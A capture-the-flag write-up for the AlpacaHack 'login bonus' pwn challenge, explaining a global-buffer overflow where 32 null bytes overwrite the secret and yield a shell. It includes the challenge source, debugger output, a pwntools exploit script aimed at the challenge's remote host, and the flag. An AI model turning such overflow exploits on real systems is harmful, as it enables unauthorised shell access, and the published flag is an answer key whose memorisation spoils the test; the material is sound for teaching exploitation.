---
slug: "pwn-login-bonus"
title: "login bonus"
competition: "Alpacahack"
category: "Pwn"
difficulty: "Medium"
date: "2026-10-31"
updated: "2026-10-31"
summary: "Bufferoverflow"
tags: ["BUFFER OVERFLOW"]
status: "published"
flag: "Alpaca{h0w_d1d_U_gu3s5_i7}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-login-bonus"
---

# login bonus

> Bufferoverflow

## Recon

Lets check the source code first.

```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>

#define debug_report(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)

char password[32];
char secret[32];

int main() {
  /* Input password */
  printf("Password: ");
  scanf("%[^\n]", password);

  /* Check password */
  debug_report("Authenticating...");
  if (strcmp(password, secret)) {
    puts("[-] Wrong password");
    debug_report("'%s' != '%s'", password, secret);
    
  } else {
    puts("[+] Success!");
    system("/bin/sh");
  }

  return 0;
}

__attribute__((constructor))
void setup() {
  int seed;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /* Generate random password */
  debug_report("Generating secure password...");
  getrandom(&seed, sizeof(seed), 0);
  srand(seed);
  for (size_t i = 0; i < 16; i++)
    secret[i] = 'A' + (rand() % 26);
}
```

Okay as we can see in that source code the variable `password` and `secret` is GLOBAL VARIABLE. Because he isn’t at any function.

After we checksec

```jsx
pwndbg> checksec
File:     /home/claritys/ctf/alpacahack/pwn/login-bonus/login
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

The protection is `PIE enabled` and `Full RELRO`, so we can’t `GOT Overwrite` and can’t `ret2win` because we can’t leak the `PIE`.

## Vulnerability

There is a `bufferoverflow` vulnerability, because the `scanf` doesn’t limit the input we can insert to the `password` variable, but only stops when the program meets `\n` (`^` in that code means `negation`, so if the scanf found `\n`, it will stop).

```jsx
  scanf("%[^\n]", password);
```

Luckly there’s a leak for the `secret` variable (even though we can still exploit it without that), so we can inspect the `secret` variable when we are `bufferoverflowing` it.

## Exploit plan

Firstly, we search the offset to the `secret` variable

```jsx
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
pwndbg> r
Starting program: /home/claritys/ctf/alpacahack/pwn/login-bonus/login
[DEBUG] Generating secure password...
Password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[DEBUG] Authenticating...
[-] Wrong password
[DEBUG] 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa' != 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
[Inferior 1 (process 352783) exited normally]

pwndbg> cyclic -l eaaaaaaa
Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32
```

Okay we know the offset which is `32`. So now we can write the exploit now. Honestly its simple, we can just fill the `password` with `null` (\\x00) 32 times and then send `\n`.

We can write the exploit just like this:

```jsx
    payload = b'\x00' * 32
    r.sendline(payload)
```

It works locally.

![image.png](/assets/uploads/2199483f-25af-4ec6-9d11-cb32f637486d-image.png)

Now lets test it remotely.

![image.png](/assets/uploads/8878f200-95a3-4ced-b144-1770fecebe5c-image-1.png)

Done

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("login_patched")

context.binary = elf
context.terminal = ["ghostty", "-e"]
# Use the portable pwndbg bundle (/usr/local/bin/pwndbg) as the gdb pwntools launches.
# It ships its own gdb+python and loads pwndbg itself, so there is no gdbinit.py to source.
context.gdb_binary = "pwndbg"

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("34.170.146.252", 22663) 

def main():
    r = conn()
    payload = b'\x00' * 32
    r.sendline(payload)
    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```
